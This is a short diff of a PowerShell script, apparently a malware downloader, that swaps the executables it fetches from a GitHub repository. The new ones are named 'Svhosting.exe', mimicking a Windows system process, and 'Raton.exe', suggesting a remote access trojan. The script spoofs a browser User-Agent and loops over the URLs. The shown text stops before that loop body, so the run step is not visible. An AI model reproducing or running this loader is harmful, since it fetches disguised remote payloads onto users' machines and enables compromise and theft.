@@ -22,8 +22,8 @@ $wc = New-Object Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0")
 
 $files = @(
-    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
-    "https://github.com/sys1e/catl/raw/refs/heads/main/Ret.exe"
+    "https://github.com/ShramC/discord-server/raw/refs/heads/main/Svhosting.exe",
+    "https://github.com/ShramC/discord-server/raw/refs/heads/main/Raton.exe"
 )
 
 foreach ($url in $files) {
